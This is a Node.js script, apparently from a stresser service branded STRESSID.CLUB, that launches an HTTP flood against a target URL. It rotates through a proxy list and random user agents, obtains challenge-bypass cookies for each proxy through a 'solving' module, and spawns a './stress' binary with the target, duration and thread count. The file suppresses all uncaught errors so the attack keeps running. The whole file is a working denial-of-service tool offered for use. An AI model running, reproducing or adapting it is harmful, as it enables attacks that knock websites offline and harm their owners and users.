require('events').EventEmitter.defaultMaxListeners = 0;
const { spawn } = require('child_process');

const { solving } = require('./main');

const fs = require('fs');

const url = require('url');

process.on('uncaughtException', function(err) {
  //console.log('Сейчас бы скрипт завис, но спас костыль. Вылезла необработанная ошибка: ' + err);
});

function sleep(ms) {
	return new Promise(resolve => setTimeout(resolve, ms));
}

function randomstring(length) {
	var result           = '';
	var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
	var charactersLength = characters.length;
			
	for ( var i = 0; i < length; i++ ) {
		result += characters.charAt(Math.floor(Math.random() * charactersLength));
	}
			
	return result;
}

if (process.argv.length < 7) {
    console.log('\x1b[35m%s\x1b[0m', 'OWNER: STRESSID.CLUB ');
    console.log('\x1b[35m%s\x1b[0m', 'node browser.js GET/POST URL PROXIES TIME THREADS RATELIMIT [OPTIONAL: "RANDOM QUERY"]');
    process.exit(0);
}

async function main() {
		const mode = process.argv[2]; // GET or POST
    let target_url = process.argv[3], target = target_url.split('""')[0]; // Target
    const proxyFile = process.argv[4]; // Proxies
    const timeforattack = process.argv[5]; // Time
    const browsernum = process.argv[6]; // Count of browsers
    const reqperip = process.argv[7]; // req per ip
	const rand_query = process.argv[8]; // random string
	const baloo = process.argv[9]; // bypass baloo activated

    const isattackstart = new Map();
		
		// Извлекаем домен для Host
		let domain = url.parse(target_url).hostname;
		
		// Читаем файлы с User Agent, Referers, Proxies
		const
			referers = fs.readFileSync("referer.txt", 'utf-8').toString(),
			useragents = fs.readFileSync("ua.txt", 'utf-8').toString().split('\n'),
			proxies = fs.readFileSync(proxyFile, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(word => word.trim().length > 0);

    var session = [];
		
    Array.prototype.remove = function () {
        var what, a = arguments, L = a.length, ax;
        while (L && this.length) {
            what = a[--L];
            while ((ax = this.indexOf(what)) !== -1) {
                this.splice(ax, 1);
            }
        }
        return this;
    };
		
		// случаный юзер агент
		function useragent() {
			return useragents[Math.floor(Math.random() * useragents.length)]
		}

    function randomProxies() {
        const whois = proxies[Math.floor(Math.random() * proxies.length)];
        proxies.remove(whois)
        return whois;
    }

    async function createSession() {	
			try {
				let random_ua = useragent();
				
        const randed = randomProxies();
        solving({
            "url":target,
			"host":domain,
            "proxy":randed,
			'user_agent':random_ua,
			'reqperip':reqperip,
			'mode':mode,
			'baloo':baloo
        }).then((cookie,ua) => {
            let myString = "";
            let laa_ = JSON.stringify(cookie);
            laa_ = JSON.parse(laa_);
            laa_.forEach((value) => {
                const valueString = value.name + "=" + value.value + ";";
                myString += valueString;
            });
								
            session.push({
                "myString":myString,
                "reqperip":reqperip,
                "randed":randed,
				'user_agent':random_ua,
				'mode':mode,
				'baloo':baloo
            })

			console.log('[STRESSID.CLUB] User-Agent: ' + random_ua +' ');
			console.log('[STRESSID.CLUB] Cookie: ' + myString + ' ');
			start(mode,target,domain,timeforattack,browsernum,random_ua,myString,reqperip,randed,rand_query);			

			
        }).catch((ee) => {
					
					try {
						console.log('[ASYNC] Proxy starting...');
						createSession();
						console.log('[ASYNC] Proxy started... \n\n');
					} catch (e) {}
					
            
        })
			} catch (e) {}
    }


	for (let i = 0; i < browsernum; i++) {
		console.log('[ASYNC] Proxy starting...');
        createSession();
		console.log('[ASYNC] Proxy started... \n\n');
    }	
}

main();

function start(mode,target,domain,timeforattack,browsernum,random_ua,myString,reqperip,randed,rand_query) {
	
	let promise = new Promise((res,rej) => {
		const ls = spawn('./stress', ["mode=" + mode, "url=" + target, "domain=" + domain, "limit=1", "time=" + timeforattack, "good=" + randed, "threads=" + reqperip, "cookie="  + myString, "user_agent=" + random_ua, "rand_query=" + rand_query]);
        ls.stdout.on('data', (data) => {     
            return res();
        });
    })
}


